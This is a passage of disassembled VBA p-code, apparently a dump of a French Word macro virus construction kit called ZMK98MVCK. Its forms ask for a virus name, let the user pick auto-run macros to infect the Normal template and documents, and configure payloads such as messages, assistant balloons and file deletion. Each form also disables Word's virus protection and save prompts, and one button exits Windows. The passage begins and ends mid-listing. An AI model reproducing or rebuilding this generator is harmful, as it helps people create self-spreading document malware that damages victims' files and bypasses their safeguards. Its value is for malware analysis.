' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "On Error Goto ErrorVVBC"
' 	PrintItemNL 
' Line #172:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix3"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Msgbox ""
' 	PrintItemSemi 
' 	Ld Message3 
' 	PrintItemSemi 
' 	LitStr 0x000B "", Title:=""
' 	PrintItemSemi 
' 	Ld Titre3 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ErrorVVBC:"
' 	PrintItemNL 
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #178:
' 	LitStr 0x0018 "C:\Windows\ZMK98MVCK.INI"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #179:
' 	Ld Compilation 
' 	ArgsCall Unlock 0x0001 
' Line #180:
' 	EndSub 
' Line #181:
' Line #182:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #183:
' 	LitStr 0x0011 "A la prochaine..."
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #184:
' 	LitStr 0x0018 "C:\Windows\ZMK98MVCK.INI"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #185:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #186:
' 	EndSub 
' Line #187:
' Line #188:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #189:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #190:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #191:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #192:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #193:
' 	EndSub 
' Macros/VBA/FileName - 4250 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x0026 " Veuillez entrer le nom de votre virus"
' 	Ld vbCritical 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0008 "FileName"
' 	LitStr 0x0003 "Nom"
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	Ld FileName 
' 	ArgsCall Unlock 0x0001 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0028 "Veuillez entrer le nom du fichier, merci"
' 	Ld vbCritical 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #10:
' 	ElseBlock 
' Line #11:
' 	LitStr 0x0008 "FileName"
' 	LitStr 0x0007 "Fichier"
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #12:
' 	Ld FileName 
' 	ArgsCall Unlock 0x0001 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #16:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #17:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #20:
' 	EndSub 
' Macros/VBA/MacroPay - 4302 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x0008 "AutoExec"
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x0008 "MacroPay"
' 	LitStr 0x0003 "Nom"
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #4:
' 	EndIfBlock 
' Line #5:
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #6:
' 	LitStr 0x0008 "MacroPay"
' 	LitStr 0x0003 "Nom"
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0008 "MacroPay"
' 	LitStr 0x0003 "Nom"
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x0007 "AutoNew"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitStr 0x0008 "MacroPay"
' 	LitStr 0x0003 "Nom"
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x0008 "AutoExit"
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0008 "MacroPay"
' 	LitStr 0x0003 "Nom"
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld MacroPay 
' 	ArgsCall Unlock 0x0001 
' Line #18:
' 	EndSub 
' Line #19:
' Line #20:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #21:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #22:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #25:
' 	LitStr 0x0008 "AutoExec"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #26:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #27:
' 	LitStr 0x0009 "AutoClose"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #28:
' 	LitStr 0x0007 "AutoNew"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #29:
' 	LitStr 0x0008 "AutoExit"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #30:
' 	EndSub 
' Macros/VBA/MacroType - 4621 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x0039 "Veuillez choisir une macro pour infecter le modèle normal"
' 	Ld vbCritical 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0009 "MacroType"
' 	LitStr 0x0006 "NameMN"
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	Ld MacroType 
' 	ArgsCall Unlock 0x0001 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	Ld ComboBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0036 "Veuillez choisir une macro pour infecter les dcouments"
' 	Ld vbCritical 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #10:
' 	ElseBlock 
' Line #11:
' 	LitStr 0x0009 "MacroType"
' 	LitStr 0x0007 "NameDOC"
' 	Ld ComboBox2 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #12:
' 	Ld MacroType 
' 	ArgsCall Unlock 0x0001 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #22:
' 	LitStr 0x0009 "AutoClose"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #23:
' 	LitStr 0x0007 "AutoNew"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #24:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld ComboBox2 
' 	ArgsMemCall AddItem 0x0001 
' Line #25:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld ComboBox2 
' 	ArgsMemCall AddItem 0x0001 
' Line #26:
' 	LitStr 0x0008 "FileSave"
' 	Ld ComboBox2 
' 	ArgsMemCall AddItem 0x0001 
' Line #27:
' 	LitStr 0x0009 "AutoClose"
' 	Ld ComboBox2 
' 	ArgsMemCall AddItem 0x0001 
' Line #28:
' 	EndSub 
' Macros/VBA/Message - 5725 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld Message 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	Ld ToggleButton1 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #4:
' 	Ld MessMEC 
' 	ArgsMemCall Show 0x0000 
' Line #5:
' 	EndIfBlock 
' Line #6:
' 	Ld ToggleButton2 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #7:
' 	Ld MessM 
' 	ArgsMemCall Show 0x0000 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	Ld ToggleButton3 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Ld MessVBE 
' 	ArgsMemCall Show 0x0000 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub ToggleButton1_Click())
' Line #15:
' 	Ld ToggleButton1 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #16:
' 	LitStr 0x0003 "Oui"
' 	Ld ToggleButton1 
' 	MemSt Caption 
' Line #17:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix1"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld ToggleButton1 
' 	MemLd Value 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #20:
' 	LitStr 0x0003 "Non"
' 	Ld ToggleButton1 
' 	MemSt Caption 
' Line #21:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix1"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	EndSub 
' Line #24:
' Line #25:
' 	FuncDefn (Private Sub ToggleButton2_Click())
' Line #26:
' 	Ld ToggleButton2 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitStr 0x0003 "Oui"
' 	Ld ToggleButton2 
' 	MemSt Caption 
' Line #28:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix2"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld ToggleButton2 
' 	MemLd Value 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitStr 0x0003 "Non"
' 	Ld ToggleButton2 
' 	MemSt Caption 
' Line #32:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix2"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
' Line #35:
' Line #36:
' 	FuncDefn (Private Sub ToggleButton3_Click())
' Line #37:
' 	Ld ToggleButton3 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitStr 0x0003 "Oui"
' 	Ld ToggleButton3 
' 	MemSt Caption 
' Line #39:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix3"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld ToggleButton3 
' 	MemLd Value 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #42:
' 	LitStr 0x0003 "Non"
' 	Ld ToggleButton3 
' 	MemSt Caption 
' Line #43:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix3"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #48:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #49:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #51:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #52:
' 	LitStr 0x0003 "Non"
' 	Ld ToggleButton1 
' 	MemSt Caption 
' Line #53:
' 	LitStr 0x0003 "Non"
' 	Ld ToggleButton2 
' 	MemSt Caption 
' Line #54:
' 	LitStr 0x0003 "Non"
' 	Ld ToggleButton3 
' 	MemSt Caption 
' Line #55:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix1"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #56:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix2"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #57:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix3"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #58:
' 	EndSub 
' Macros/VBA/MessM - 2759 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x002E "Veuillez entrer le titre de la boîte à message"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "MessMT"
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0025 "Veuillez entrer le message à afficher"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "MessMM"
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #13:
' 	Ld MessM 
' 	ArgsCall Unlock 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #22:
' 	EndSub 
' Macros/VBA/MessMEC - 2745 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x002E "Veuillez entrer le titre de la boîte à message"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0008 "MessMECT"
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0025 "Veuillez entrer le message à afficher"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0008 "MessMECM"
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #13:
' 	Ld MessMEC 
' 	ArgsCall Unlock 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	EndSub 
' Macros/VBA/MessVBE - 2745 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x002E "Veuillez entrer le titre de la boîte à message"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0008 "MessVBET"
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0025 "Veuillez entrer le message à afficher"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0008 "MessVBEM"
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #13:
' 	Ld MessVBE 
' 	ArgsCall Unlock 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	EndSub 
' Macros/VBA/PayAssist - 2744 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x0033 "Veuillez entrer le titre de la bulle de l'assistant"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0009 "PayAssist"
' 	LitStr 0x0005 "Titre"
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0025 "Veuillez entrer le message à afficher"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	LitStr 0x0009 "PayAssist"
' 	LitStr 0x0007 "Message"
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #13:
' 	Ld PayAssist 
' 	ArgsCall Unlock 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	EndSub 
' Macros/VBA/PayDelete - 6149 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld CheckBox1 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier1"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier1"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Ld CheckBox2 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier2"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier2"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld CheckBox3 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier3"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier3"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld CheckBox4 
' 	MemLd Value 
' 	LitVarSpecial (True)
